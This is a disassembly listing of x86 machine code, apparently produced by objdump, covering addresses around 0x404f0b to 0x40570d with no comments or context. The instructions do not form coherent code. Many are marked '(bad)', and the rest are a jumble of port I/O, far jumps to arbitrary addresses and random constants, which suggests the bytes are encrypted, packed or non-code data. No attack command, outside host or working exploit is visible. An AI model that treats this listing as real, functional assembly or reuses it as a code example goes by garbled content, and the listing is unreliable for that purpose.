  404f0b:	and    BYTE PTR [ecx+ecx*4+0x6b0a307f],dh
  404f12:	sbb    DWORD PTR [ebx+0x5fbb49e1],0xc11da6d6
  404f1c:	dec    esi
  404f1d:	pop    eax
  404f1e:	cwde   
  404f1f:	mov    ds:0xf5366e05,al
  404f24:	pusha  
  404f25:	mov    bl,dh
  404f27:	push   edx
  404f28:	dec    ecx
  404f29:	or     BYTE PTR [edi-0x7bc56895],cl
  404f2f:	xor    eax,0x383bdff2
  404f34:	loope  0x404fa3
  404f36:	and    BYTE PTR [ebp+0xd4d1991],ah
  404f3c:	bnd ret 
  404f3e:	mov    cx,0xe04b
  404f42:	cmp    BYTE PTR [ebx+0x4d845db],ah
  404f48:	aam    0xac
  404f4a:	pop    ds
  404f4b:	jmp    0x404f68
  404f4d:	cmp    edi,DWORD PTR [esi]
  404f4f:	ret    
  404f50:	add    eax,0xe1f93f09
  404f55:	rcr    BYTE PTR [ebp-0x44],0xba
  404f59:	push   edx
  404f5a:	mov    ebx,DWORD PTR [ebp-0x60c6342c]
  404f60:	ins    DWORD PTR es:[edi],dx
  404f61:	in     al,dx
  404f62:	inc    eax
  404f63:	int    0x84
  404f65:	push   edi
  404f66:	dec    edi
  404f67:	add    dh,BYTE PTR [ecx-0x3a2c0f67]
  404f6d:	adc    DWORD PTR [ebx],eax
  404f6f:	or     dh,BYTE PTR [eax]
  404f71:	or     ah,BYTE PTR [edx+0x62200e1a]
  404f77:	loop   0x404f74
  404f79:	daa    
  404f7a:	rol    DWORD PTR [ebx+0xfe2518b],0xe7
  404f81:	lods   eax,DWORD PTR ds:[esi]
  404f82:	sub    eax,DWORD PTR [ecx]
  404f84:	sar    DWORD PTR [edi],1
  404f86:	iret   
  404f87:	out    0xb6,al
  404f89:	dec    edx
  404f8a:	(bad)  
  404f8b:	push   esi
  404f8c:	pop    esi
  404f8d:	adc    DWORD PTR [edi+0x1c],0x6e127cab
  404f94:	arpl   WORD PTR [ebx],bp
  404f96:	int    0xd5
  404f98:	xor    bl,BYTE PTR [ebx-0x7951cf65]
  404f9e:	add    ebx,DWORD PTR [edi]
  404fa0:	mov    esi,ss
  404fa2:	ja     0x404f37
  404fa4:	cmp    eax,0x77aede21
  404fa9:	call   0xa253b962
  404fae:	mov    eax,ds:0xd56e41a5
  404fb3:	jns    0x404fc1
  404fb5:	std    
  404fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb7:	xor    eax,0xc04a3c9b
  404fbc:	and    BYTE PTR [ecx],ch
  404fbe:	imul   esp,DWORD PTR [edx+ebp*8+0x3],0x8634fd87
  404fc6:	add    al,0xfb
  404fc8:	mov    edi,0x8a8223a2
  404fcd:	pop    eax
  404fce:	add    ecx,edi
  404fd0:	test   DWORD PTR [ebx-0x38],eax
  404fd3:	mov    dh,0x1
  404fd5:	xchg   ebp,eax
  404fd6:	inc    ebp
  404fd7:	(bad)  
  404fd8:	outs   dx,DWORD PTR ds:[esi]
  404fd9:	dec    ebx
  404fda:	fst    QWORD PTR [ebp-0x3a]
  404fdd:	xchg   esp,eax
  404fde:	test   al,0xa9
  404fe0:	adc    al,0xb7
  404fe2:	dec    esp
  404fe3:	or     BYTE PTR [ecx],bl
  404fe5:	shl    DWORD PTR cs:[esi-0x2f402e73],1
  404fec:	sbb    BYTE PTR [esi-0x39],bl
  404fef:	cmp    edi,ebp
  404ff1:	stos   DWORD PTR es:[edi],eax
  404ff2:	push   ebx
  404ff3:	sub    ah,bh
  404ff5:	pop    es
  404ff6:	std    
  404ff7:	push   esp
  404ff8:	test   eax,0x890df439
  404ffd:	add    DWORD PTR [edi+esi*2+0x3d01c3fb],ebx
  405004:	loop   0x404fd3
  405006:	mov    ds:0xae47c20e,al
  40500b:	ins    BYTE PTR es:[edi],dx
  40500c:	mov    al,ds:0x8971d004
  405011:	mov    DWORD PTR gs:[esi-0x4a],0xec8583fa
  405019:	sub    edi,DWORD PTR [ebp-0x411236f1]
  40501f:	inc    eax
  405020:	neg    DWORD PTR [eax+0x1f]
  405023:	pop    ebp
  405024:	mov    cl,0x7c
  405026:	and    DWORD PTR [esi+esi*2-0x2b],edx
  40502a:	xlat   BYTE PTR ds:[ebx]
  40502b:	push   0x80f93ea5
  405030:	iret   
  405031:	cdq    
  405032:	fsub   QWORD PTR [edx]
  405034:	and    bh,BYTE PTR [edx-0x6f]
  405037:	pusha  
  405038:	inc    ebp
  405039:	stos   DWORD PTR es:[edi],eax
  40503a:	push   ds
  40503b:	stos   BYTE PTR es:[edi],al
  40503c:	retf   0x30b3
  40503f:	push   ds
  405040:	sub    DWORD PTR [esi+eiz*4-0x15299ee8],esi
  405047:	dec    esi
  405048:	ja     0x404ff3
  40504a:	push   ebp
  40504b:	push   ds
  40504c:	dec    edx
  40504d:	jecxz  0x404fd6
  40504f:	addr16 xor al,0x14
  405052:	cmp    ah,BYTE PTR [esi-0x4d372d9e]
  405058:	push   cs
  405059:	les    esp,FWORD PTR [ebp-0x4b]
  40505c:	je     0x404fe6
  40505e:	outs   dx,DWORD PTR ds:[esi]
  40505f:	pop    ss
  405060:	repnz or al,0x6e
  405063:	enter  0xec8f,0xeb
  405067:	sbb    eax,0x436f6606
  40506c:	ins    BYTE PTR es:[edi],dx
  40506d:	retf   0xc59a
  405070:	iret   
  405071:	std    
  405072:	push   ds
  405073:	cmp    al,0x8a
  405075:	test   BYTE PTR [ebx+esi*4-0x24],ch
  405079:	shl    BYTE PTR [ebx-0x2b340f1],cl
  40507f:	jne    0x4050fe
  405081:	add    esp,DWORD PTR [edi-0x25ef90af]
  405087:	xlat   BYTE PTR ds:[ebx]
  405088:	mov    eax,0x700b0942
  40508d:	pop    edi
  40508e:	out    0xbe,eax
  405090:	cmp    eax,DWORD PTR [edx*1-0xbf4db8d]
  405097:	cmp    ecx,ebp
  405099:	(bad)  
  40509a:	in     eax,dx
  40509b:	pop    ecx
  40509c:	sbb    dl,BYTE PTR [edi-0x79296024]
  4050a2:	sahf   
  4050a3:	push   esp
  4050a4:	pop    es
  4050a5:	test   DWORD PTR [eax-0x66],esp
  4050a8:	nop
  4050a9:	mov    es,esi
  4050ab:	jg     0x405121
  4050ad:	pop    edi
  4050ae:	ds or  al,0x9a
  4050b1:	mov    WORD PTR [eax],es
  4050b3:	in     eax,dx
  4050b4:	xor    esp,DWORD PTR [eax+0x29dae171]
  4050ba:	pop    esp
  4050bb:	or     eax,0xe8382817
  4050c0:	mov    edx,0xe16bf39d
  4050c5:	rcr    DWORD PTR [ebx+0x4d],0x4e
  4050c9:	mov    al,ds:0x9ebd364b
  4050ce:	sbb    esp,esp
  4050d0:	inc    eax
  4050d1:	mov    ebp,0x75b23aa7
  4050d6:	or     al,0xc4
  4050d8:	sub    ecx,DWORD PTR [ebx+0x3435377c]
  4050de:	push   ebp
  4050df:	jp     0x405117
  4050e1:	adc    al,BYTE PTR [edi+eax*1+0x7d]
  4050e5:	inc    edi
  4050e6:	cdq    
  4050e7:	pop    DWORD PTR [ecx+0x5037ee20]
  4050ed:	sub    BYTE PTR [edx+eiz*1],al
  4050f0:	mov    esp,0x15cf0f4a
  4050f5:	sub    DWORD PTR [eax],ecx
  4050f7:	dec    esp
  4050f8:	inc    ecx
  4050fa:	dec    edi
  4050fb:	mov    WORD PTR [ebp-0x1d806b70],gs
  405101:	jb     0x40517a
  405103:	or     ebp,0x59
  405106:	repz mov ch,BYTE PTR [edx+edi*2]
  40510a:	and    bl,bh
  40510c:	(bad)  
  40510d:	xor    ebp,ebx
  40510f:	mov    bh,0xe1
  405111:	scas   eax,DWORD PTR es:[edi]
  405112:	cmp    DWORD PTR [edi-0x16],esi
  405115:	sub    ah,bh
  405117:	push   eax
  405118:	inc    esi
  405119:	inc    ebx
  40511a:	std    
  40511b:	mov    bl,0x99
  40511d:	mov    ebp,0xc4f01405
  405122:	inc    esp
  405123:	push   edi
  405124:	pop    ss
  405125:	mov    esi,0xe2a3303
  40512a:	retf   0x3924
  40512d:	pop    ebp
  40512e:	iret   
  40512f:	add    eax,0xe184505
  405134:	sub    DWORD PTR [eax-0x79],esp
  405137:	adc    al,0x73
  405139:	lea    eax,[ebx-0x76fdc7b3]
  40513f:	cli    
  405140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405141:	or     eax,0xc9c3a479
  405146:	or     esp,edx
  405148:	mov    ecx,0xb0242d2a
  40514d:	scas   al,BYTE PTR es:[edi]
  40514e:	inc    esi
  40514f:	ret    0x6bcf
  405152:	push   esi
  405153:	not    DWORD PTR [edx-0x298df1ec]
  405159:	mov    eax,ds:0x3422e92
  40515e:	mov    esi,DWORD PTR [edi+0x69]
  405161:	and    eax,0xb64cbff8
  405166:	jle    0x405165
  405168:	in     al,0x4c
  40516a:	test   al,0x31
  40516c:	loopne 0x4050ff
  40516e:	jge    0x4051c5
  405170:	inc    edx
  405171:	fwait
  405172:	sub    eax,0xc8d3ebf2
  405177:	cmp    esi,DWORD PTR [eax-0x5fa7c648]
  40517d:	adc    edi,esp
  40517f:	sahf   
  405180:	sbb    BYTE PTR [edi],bh
  405182:	repnz pop ebx
  405184:	cwde   
  405185:	js     0x4051ff
  405187:	jg     0x405149
  405189:	jecxz  0x4051ed
  40518b:	push   edx
  40518c:	and    DWORD PTR [eax-0x3463605a],ecx
  405192:	xor    DWORD PTR [edx+0x61d195da],eax
  405198:	out    0xe,eax
  40519a:	jmp    0xf479bcb2
  40519f:	stos   BYTE PTR es:[edi],al
  4051a0:	ss mov bl,0x81
  4051a3:	dec    ecx
  4051a4:	sub    bl,ch
  4051a6:	scas   al,BYTE PTR es:[edi]
  4051a7:	fcom   QWORD PTR [edi-0x6e]
  4051aa:	mov    bl,0xb9
  4051ac:	aad    0xed
  4051ae:	dec    eax
  4051af:	in     al,dx
  4051b0:	cs xchg ecx,eax
  4051b2:	loop   0x40513a
  4051b4:	rol    DWORD PTR [eax+edx*1],cl
  4051b7:	sahf   
  4051b8:	push   0xe87dde6c
  4051bd:	pop    edi
  4051be:	mov    ebp,0xacea2abc
  4051c3:	add    eax,0x8d6af469
  4051c8:	scas   al,BYTE PTR es:[edi]
  4051c9:	inc    ebp
  4051ca:	popa   
  4051cb:	pop    edx
  4051cc:	ja     0x405205
  4051ce:	nop
  4051cf:	enter  0xf595,0x96
  4051d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051d4:	stc    
  4051d5:	or     eax,0x96393c40
  4051da:	ret    
  4051db:	fst    QWORD PTR [ebp*8+0x6a314059]
  4051e2:	ins    DWORD PTR es:[edi],dx
  4051e3:	mov    ds:0xb9e10e38,eax
  4051e8:	and    bl,BYTE PTR [edx]
  4051ea:	stos   DWORD PTR es:[edi],eax
  4051eb:	iret   
  4051ec:	ret    0xa179
  4051ef:	into   
  4051f0:	pop    esp
  4051f1:	addr16 jp 0x4051d3
  4051f4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4051f6:	aad    0xc1
  4051f8:	inc    esi
  4051f9:	push   0x1b9ee501
  4051fe:	repz xchg ebp,eax
  405200:	js     0x40524e
  405202:	int    0x19
  405204:	adc    eax,0x1e454e4e
  405209:	xchg   edi,eax
  40520a:	xchg   ebx,eax
  40520b:	imul   eax,DWORD PTR [ebx-0x28],0x11
  40520f:	dec    esp
  405210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405211:	lahf   
  405212:	xor    bl,BYTE PTR [ebx-0xc]
  405215:	adc    eax,0x2a94f5dd
  40521a:	scas   al,BYTE PTR es:[edi]
  40521b:	pop    ecx
  40521c:	mov    cl,0x79
  40521e:	hlt    
  40521f:	loopne 0x40520f
  405221:	inc    esi
  405222:	mov    esi,DWORD PTR [edi-0x47]
  405225:	test   DWORD PTR [eax-0x6b],esi
  405228:	cdq    
  405229:	stc    
  40522a:	jmp    0x4051ff
  40522c:	jmp    0x20ee:0x54a329bd
  405233:	fldenv [edi]
  405235:	inc    ebp
  405236:	jl     0x4051c7
  405238:	cmp    al,BYTE PTR [esi+0x2d]
  40523b:	mov    dl,0x70
  40523d:	es xchg ecx,eax
  40523f:	fimul  DWORD PTR [esi]
  405241:	sbb    al,0x12
  405243:	dec    esp
  405244:	adc    eax,0x17abe9b3
  405249:	push   cs
  40524a:	jge    0x4051f0
  40524c:	cmp    al,0x37
  40524e:	xor    bl,BYTE PTR [eax+ebx*2]
  405251:	retf   
  405252:	sub    dl,bh
  405254:	(bad)  
  405256:	popa   
  405257:	clc    
  405258:	add    al,0x8e
  40525a:	sub    BYTE PTR [ecx],bh
  40525c:	daa    
  40525d:	inc    esi
  40525e:	in     al,0x43
  405260:	lods   eax,DWORD PTR ds:[esi]
  405261:	inc    ebx
  405262:	(bad)  
  405263:	dec    esi
  405264:	les    ecx,FWORD PTR [ebp+edx*2-0x69]
  405268:	push   edx
  405269:	xor    ch,BYTE PTR [bx-0x11]
  40526d:	or     DWORD PTR [ebp-0xef1ef1],esp
  405273:	sar    BYTE PTR [edx-0x62],0x90
  405277:	or     edx,DWORD PTR [ebp+0x4070f946]
  40527d:	mov    edi,DWORD PTR [edx+0x15fbedc4]
  405283:	pop    ebx
  405284:	dec    ebp
  405285:	inc    ecx
  405286:	shl    BYTE PTR ds:0x90dccb75,1
  40528c:	adc    al,BYTE PTR [ebp-0x3d]
  40528f:	lds    ebx,FWORD PTR [ecx+ebx*1]
  405292:	retf   
  405293:	mov    edx,0xd6e227e
  405298:	xor    edx,DWORD PTR [edx+ecx*2]
  40529b:	or     cl,BYTE PTR ds:0xcdf84932
  4052a1:	adc    al,0x0
  4052a3:	lahf   
  4052a4:	mov    edi,?
  4052a6:	inc    esp
  4052a7:	test   al,0xe
  4052a9:	jge    0x4052b9
  4052ab:	or     eax,0x36556b3d
  4052b0:	mov    bl,0x9c
  4052b2:	fdivr  st,st(5)
  4052b4:	pop    ds
  4052b5:	pop    edi
  4052b6:	fidivr DWORD PTR [ecx-0x278040bb]
  4052bc:	cmp    BYTE PTR [edi],ah
  4052be:	dec    ebp
  4052bf:	cld    
  4052c0:	and    eax,0xabb35cdf
  4052c5:	sbb    al,0xf7
  4052c7:	add    DWORD PTR [eax+esi*1],ebp
  4052ca:	pusha  
  4052cb:	adc    al,0xec
  4052cd:	adc    ch,ah
  4052cf:	dec    ebp
  4052d0:	es dec ecx
  4052d2:	add    ebx,DWORD PTR [ebx]
  4052d4:	jbe    0x4052c0
  4052d6:	pop    eax
  4052d7:	pop    esp
  4052d8:	in     al,0x8e
  4052da:	(bad)  
  4052db:	cmp    al,al
  4052dd:	fs (bad) 
  4052df:	adc    BYTE PTR [esi-0x1],0x48
  4052e3:	(bad)  
  4052e4:	cmp    ecx,ecx
  4052e6:	cmp    eax,0x80ba1754
  4052eb:	pushf  
  4052ec:	pop    ecx
  4052ed:	inc    edx
  4052ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ef:	push   ecx
  4052f0:	retf   
  4052f1:	ret    
  4052f2:	cmp    eax,0xd7a5f2e1
  4052f7:	pushf  
  4052f8:	dec    eax
  4052f9:	xchg   ebx,eax
  4052fa:	pop    ebp
  4052fb:	sub    edx,ecx
  4052fd:	js     0x4052ad
  4052ff:	clc    
  405300:	shl    BYTE PTR [ebx-0x76],0x1
  405304:	push   ss
  405305:	add    bh,bl
  405307:	mov    ds:0x807beabb,eax
  40530c:	jecxz  0x40531a
  40530e:	ss jne 0x40532b
  405311:	fst    DWORD PTR [ecx+0x55709f44]
  405317:	pop    ebp
  405318:	inc    ecx
  405319:	jmp    DWORD PTR ds:0xfcf33870
  40531f:	adc    DWORD PTR [edi],esi
  405321:	sub    eax,0xab1fe15d
  405326:	in     al,0x11
  405328:	test   BYTE PTR [eax+0x1e],bh
  40532b:	add    BYTE PTR [edi+ecx*1],al
  40532e:	call   0xdb643c9a
  405333:	sub    eax,0x86e74cdf
  405338:	test   BYTE PTR [eax+0x5f],dl
  40533b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40533c:	out    dx,al
  40533d:	cwde   
  40533e:	cli    
  40533f:	repz leave 
  405341:	jno    0x4052fd
  405343:	jne    0x405309
  405345:	inc    esi
  405346:	mov    ecx,0x1b898206
  40534b:	cmp    DWORD PTR [eax+0x3a98c83c],0x78ef6a8c
  405355:	sbb    DWORD PTR es:[ebp-0x26],edx
  405359:	cmp    BYTE PTR [ecx+ebp*1-0x18fb1165],0x6
  405361:	add    BYTE PTR [ebp-0x7e39bccf],dl
  405367:	xchg   DWORD PTR [edx-0x66a25568],eax
  40536d:	clc    
  40536e:	out    dx,eax
  40536f:	xchg   DWORD PTR ds:0xf476c47c,edx
  405375:	dec    eax
  405376:	ret    0x6573
  405379:	addr16 int 0x36
  40537c:	mov    ah,0xdf
  40537e:	retf   0x24f9
  405381:	btc    DWORD PTR [edx+0x5218f522],ecx
  405388:	aad    0x80
  40538a:	adc    ebx,esp
  40538c:	in     al,0xca
  40538e:	daa    
  40538f:	adc    al,0x99
  405391:	sub    DWORD PTR [ecx-0xdfb08cb],esi
  405397:	neg    BYTE PTR ds:0x8456a507
  40539d:	xchg   edx,eax
  40539e:	pop    esp
  40539f:	cmp    DWORD PTR [esi+edi*4+0x32fb2765],esp
  4053a6:	ror    al,0x43
  4053a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053aa:	xchg   edi,eax
  4053ab:	(bad)  
  4053ac:	call   0xc53bce4a
  4053b1:	sub    BYTE PTR [eax-0x7e],bl
  4053b4:	mov    bh,0xad
  4053b6:	jno    0x40541d
  4053b8:	enter  0xd4ac,0x69
  4053bc:	mov    ebp,0x620ef18d
  4053c1:	mov    edi,0x7649a2f1
  4053c6:	out    dx,al
  4053c7:	out    0x2b,al
  4053c9:	pushf  
  4053ca:	or     eax,0xa9952ee1
  4053cf:	inc    edi
  4053d0:	mov    edx,0xf810726c
  4053d5:	push   0x78d64764
  4053da:	(bad)  
  4053db:	sub    al,0x7e
  4053dd:	inc    edx
  4053de:	and    BYTE PTR [ecx-0x49835aec],al
  4053e4:	pop    ss
  4053e5:	mov    ecx,edx
  4053e7:	sub    BYTE PTR [edx-0x1e],0xfb
  4053eb:	fisttp WORD PTR [edx-0x7072bc03]
  4053f1:	push   cs
  4053f2:	jmp    0x8017:0x7f6ae896
  4053f9:	(bad)  
  4053fa:	cmp    eax,DWORD PTR ds:0xca9ffaa3
  405400:	cwde   
  405401:	dec    edi
  405402:	in     al,0x14
  405404:	mov    esp,0x45e3e3fd
  405409:	es mov ch,0x1b
  40540c:	or     dl,dl
  40540e:	xchg   ecx,eax
  40540f:	dec    ecx
  405410:	inc    edx
  405411:	pushf  
  405412:	jle    0x40540c
  405414:	pop    esi
  405415:	inc    esp
  405416:	outs   dx,DWORD PTR ds:[esi]
  405417:	ss ret 0xb595
  40541b:	fsub   st(2),st
  40541d:	mov    dl,0xf7
  40541f:	retf   
  405420:	ins    DWORD PTR es:[edi],dx
  405421:	or     bh,BYTE PTR [ecx]
  405423:	jae    0x4053a8
  405425:	mov    ebx,0xc9bd35a3
  40542a:	jne    0x405490
  40542c:	push   eax
  40542d:	jg     0x40549c
  40542f:	and    ah,ch
  405431:	int3   
  405432:	enter  0xd65e,0x28
  405436:	xchg   DWORD PTR [ebp-0x52],edx
  405439:	ja     0x40546d
  40543b:	daa    
  40543c:	and    esp,DWORD PTR [edx-0x61962cdb]
  405442:	or     eax,0x7de1da01
  405447:	and    BYTE PTR [edi+0x3ac0a4e9],dh
  40544d:	sub    edi,DWORD PTR [eax]
  40544f:	sbb    eax,0x18539cdd
  405454:	repnz int 0x7a
  405457:	mov    ss,WORD PTR [ebx]
  405459:	lock add al,0x0
  40545c:	xor    ecx,DWORD PTR [ebx]
  40545e:	rcl    ah,1
  405460:	pushf  
  405461:	pop    es
  405462:	dec    ebp
  405463:	push   es
  405464:	mov    ds:0xbd5ac4e2,eax
  405469:	inc    ecx
  40546a:	ror    DWORD PTR [eax],0xba
  40546d:	mov    ch,0xfd
  40546f:	and    BYTE PTR [eax-0xa],dh
  405472:	xchg   ax,cx
  405475:	lea    esi,[edi+0x33]
  405478:	sub    BYTE PTR [edi+0x3b],ah
  40547b:	and    esp,DWORD PTR [ebx]
  40547d:	arpl   WORD PTR [edx+0x61],cx
  405480:	les    edi,FWORD PTR [ecx+0x29]
  405483:	xchg   esi,eax
  405484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405485:	std    
  405486:	pop    DWORD PTR [edi]
  405488:	ds std 
  40548a:	jb     0x405423
  40548c:	adc    dh,cl
  40548e:	sbb    BYTE PTR [edi-0x200e6479],bl
  405494:	in     al,0xfe
  405496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405497:	repz cs das 
  40549a:	mov    edi,ecx
  40549c:	or     edx,DWORD PTR [ebx+ebx*2-0x2aaea6c8]
  4054a3:	push   ecx
  4054a4:	mov    eax,ds:0x1113ec70
  4054a9:	mov    ds:0x59e08e0c,al
  4054ae:	xor    ebp,DWORD PTR [edi]
  4054b0:	pop    eax
  4054b1:	push   ds
  4054b2:	stos   DWORD PTR es:[edi],eax
  4054b3:	or     BYTE PTR [esi],bl
  4054b5:	pop    edx
  4054b6:	inc    esi
  4054b7:	ret    
  4054b8:	pop    es
  4054b9:	sub    cl,BYTE PTR [esi]
  4054bb:	loopne 0x405478
  4054bd:	scas   eax,DWORD PTR es:[edi]
  4054be:	out    dx,eax
  4054bf:	mov    ecx,DWORD PTR [ebx-0x46]
  4054c2:	addr16 cmp al,0x96
  4054c5:	add    eax,eax
  4054c7:	sub    DWORD PTR [edi],edx
  4054c9:	mov    dl,0x52
  4054cb:	adc    al,0xb0
  4054cd:	test   DWORD PTR [ecx+edi*2],0x6ff58540
  4054d4:	stc    
  4054d5:	fbld   TBYTE PTR [ebx-0x2f5dcb22]
  4054db:	and    edi,DWORD PTR [ecx]
  4054dd:	cmp    al,0xc1
  4054df:	xor    BYTE PTR [ebp+0x5b],0x41
  4054e3:	dec    ebp
  4054e4:	sbb    dl,BYTE PTR [ebp+0x6f]
  4054e7:	es js  0x4054af
  4054ea:	or     eax,0x66e19cf8
  4054ef:	add    BYTE PTR [eax+0x13],ch
  4054f2:	cmp    eax,0xfd57d304
  4054f7:	iret   
  4054f8:	daa    
  4054f9:	popa   
  4054fa:	and    BYTE PTR [ebp+0x3db153e7],al
  405500:	xchg   ecx,eax
  405501:	mov    ebp,0x35495354
  405506:	cmp    eax,0x4ffc6e2c
  40550b:	pop    edx
  40550c:	push   edx
  40550d:	mov    edx,0x573bf53c
  405512:	pusha  
  405513:	inc    edx
  405514:	xor    esp,DWORD PTR [edx+0x48d17d23]
  40551a:	add    eax,0x6e06dd7d
  40551f:	shl    eax,cl
  405521:	dec    DWORD PTR [eax+0x1d6efd41]
  405527:	jae    0x4054bb
  405529:	test   cl,cl
  40552b:	dec    ebx
  40552c:	out    dx,al
  40552d:	icebp  
  40552e:	call   0x247468cb
  405533:	adc    dl,BYTE PTR [ebp+0x4e]
  405536:	pop    edi
  405537:	and    al,0xb6
  405539:	out    0x7a,al
  40553b:	add    esp,eax
  40553d:	in     eax,dx
  40553e:	popa   
  40553f:	jb     0x405532
  405541:	fistp  QWORD PTR [ecx-0x2f]
  405544:	xor    eax,0xa57556e2
  405549:	cs ds in eax,dx
  40554c:	pop    ebx
  40554d:	in     al,dx
  40554e:	mov    cl,0x91
  405550:	dec    edi
  405551:	scas   eax,DWORD PTR es:[edi]
  405552:	xchg   edi,eax
  405553:	lods   eax,DWORD PTR ds:[esi]
  405554:	push   eax
  405555:	aam    0xd4
  405557:	mov    ch,0xcd
  405559:	(bad)  
  40555a:	mov    eax,0x30d04f89
  40555f:	test   DWORD PTR [ebx-0x38fca33b],ebp
  405565:	xchg   edi,eax
  405566:	mov    ds:0xa5e3f721,eax
  40556b:	and    BYTE PTR [eax],0xda
  40556e:	dec    edi
  40556f:	fnsave [eax+0x720260cc]
  405575:	mov    bl,0x2b
  405577:	pop    DWORD PTR [eax-0x7346b5ac]
  40557d:	pop    ds
  40557e:	mov    bl,BYTE PTR [ebx+0x47919312]
  405584:	(bad)  
  405585:	xlat   BYTE PTR ds:[ebx]
  405586:	add    esp,DWORD PTR [esi-0x6727d1c8]
  40558c:	repz stc 
  40558e:	stc    
  40558f:	and    eax,0x41338aa5
  405594:	imul   edx,DWORD PTR [eax+0x5710098e],0xd4cf4de1
  40559e:	imul   esp,DWORD PTR [edx+0x14],0x5a
  4055a2:	inc    esp
  4055a3:	sub    ebp,esi
  4055a5:	sub    BYTE PTR ds:0xb98d4656,ah
  4055ab:	(bad)  
  4055ac:	sti    
  4055ad:	test   eax,0xfaf3e2f5
  4055b2:	add    BYTE PTR [ebx],dl
  4055b4:	loope  0x4055ba
  4055b6:	lahf   
  4055b7:	sbb    eax,0x4725f483
  4055bc:	ret    
  4055bd:	sbb    eax,0x4cc180f3
  4055c2:	xchg   BYTE PTR [eax+0x2e],ah
  4055c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055c6:	cmp    BYTE PTR [ebp+0x2a4bfd85],ch
  4055cc:	lods   eax,DWORD PTR ds:[esi]
  4055cd:	inc    ebx
  4055ce:	push   0xffffffb2
  4055d0:	and    al,0x26
  4055d2:	fisttp QWORD PTR [edx+ebx*8-0x7a992917]
  4055d9:	lods   al,BYTE PTR ds:[esi]
  4055da:	inc    esp
  4055db:	push   ss
  4055dc:	fidiv  DWORD PTR [ecx+ebx*1-0x66]
  4055e0:	push   edi
  4055e1:	out    dx,al
  4055e2:	and    ecx,edi
  4055e4:	sub    edi,DWORD PTR [edi+0x766f9267]
  4055ea:	xchg   ebx,eax
  4055eb:	int3   
  4055ec:	adc    eax,0x21df8782
  4055f1:	jbe    0x405622
  4055f3:	stos   BYTE PTR es:[edi],al
  4055f4:	xor    eax,0xf05cc8ac
  4055f9:	sahf   
  4055fa:	mov    al,ds:0x5dd47859
  4055ff:	sub    edi,DWORD PTR [ebx-0x4e058d5c]
  405605:	ret    
  405606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405607:	(bad)  
  405608:	clc    
  405609:	addr16 pop di
  40560c:	daa    
  40560d:	mov    cl,0xc4
  40560f:	push   ds
  405610:	jae    0x4055cf
  405612:	lds    ebp,FWORD PTR [esi-0x3a]
  405615:	mov    bl,0xc6
  405617:	(bad)  
  405618:	mov    dh,BYTE PTR [esi-0x6b]
  40561b:	jo     0x405616
  40561d:	(bad)  
  40561e:	nop
  40561f:	sub    ah,BYTE PTR [edi+eiz*1]
  405622:	popf   
  405623:	fbstp  TBYTE PTR [edx-0x3afb2720]
  405629:	bound  esi,QWORD PTR [ebp-0x4b]
  40562c:	xor    BYTE PTR [edi-0x47],dl
  40562f:	push   ss
  405630:	aam    0x67
  405632:	pop    esi
  405633:	int3   
  405634:	enter  0xff82,0x89
  405638:	test   BYTE PTR [edx+0x77d39f18],ah
  40563e:	push   edx
  40563f:	out    dx,al
  405640:	clc    
  405641:	lea    edx,[eax+0x2551d5cd]
  405647:	(bad)  
  405648:	mov    esp,0x2b533f55
  40564d:	jmp    0x3d904631
  405652:	mov    edx,0x2d54f9a6
  405657:	stos   DWORD PTR es:[edi],eax
  405658:	call   0x78848d98
  40565d:	leave  
  40565e:	push   ebp
  40565f:	cmp    al,0x45
  405661:	cmp    ebx,DWORD PTR [eax-0x337ce5f1]
  405667:	(bad)  
  405668:	out    0x3e,al
  40566a:	test   eax,0x87873efe
  40566f:	cmp    eax,0x3d1b622f
  405674:	in     al,dx
  405675:	cmp    DWORD PTR [edi+0x2],edi
  405678:	ja     0x4056a2
  40567a:	fadd   QWORD PTR [edx]
  40567c:	mov    cl,0x34
  40567e:	sub    BYTE PTR [eax+0x2],ah
  405681:	xor    bh,0x20
  405684:	jl     0x4056ee
  405686:	push   0x9b1db982
  40568b:	add    al,0x5c
  40568d:	jmp    0x9120c734
  405692:	out    dx,al
  405693:	xchg   BYTE PTR [esi+ecx*4],cl
  405696:	mov    cl,0x9f
  405698:	stos   DWORD PTR es:[edi],eax
  405699:	out    0xc4,al
  40569b:	int    0x4b
  40569d:	add    esi,0xffffff80
  4056a0:	aam    0xac
  4056a2:	fisttp DWORD PTR [eax+0xd83db44]
  4056a8:	jge    0x4056d3
  4056aa:	or     cl,ah
  4056ac:	daa    
  4056ad:	mov    ebp,cs
  4056af:	pop    ebp
  4056b0:	jmp    0x69c5b0a9
  4056b5:	sub    BYTE PTR [eax-0x5c],ah
  4056b8:	outs   dx,DWORD PTR ds:[esi]
  4056b9:	mov    ch,0x66
  4056bb:	call   0xcdfd:0x51ad9656
  4056c2:	push   edi
  4056c3:	mov    gs,WORD PTR [ecx]
  4056c5:	test   BYTE PTR [ecx+0x5111f590],0x5
  4056cc:	pop    ds
  4056cd:	dec    ecx
  4056ce:	mov    ah,0x51
  4056d0:	gs (bad) 
  4056d2:	mov    edx,0x7407b403
  4056d7:	jo     0x40570c
  4056d9:	imul   edx,ebp,0x36
  4056dc:	mov    bh,0x7b
  4056de:	fisttp DWORD PTR [eax*4-0x79f48482]
  4056e5:	nop
  4056e6:	cdq    
  4056e7:	sar    eax,0x4b
  4056ea:	or     al,0x9b
  4056ec:	test   eax,0xc819fa6d
  4056f1:	and    DWORD PTR [esi+0x26],edi
  4056f4:	outs   dx,DWORD PTR ds:[esi]
  4056f5:	ins    DWORD PTR es:[edi],dx
  4056f6:	loop   0x4056c8
  4056f8:	enter  0x7e7,0xc3
  4056fc:	iret   
  4056fd:	ret    
  4056fe:	and    al,0xa0
  405700:	mov    bl,0xd5
  405702:	mov    eax,0x27349807
  405707:	xor    eax,DWORD PTR [edx+0x5c324b89]
  40570d:	dec    ecx
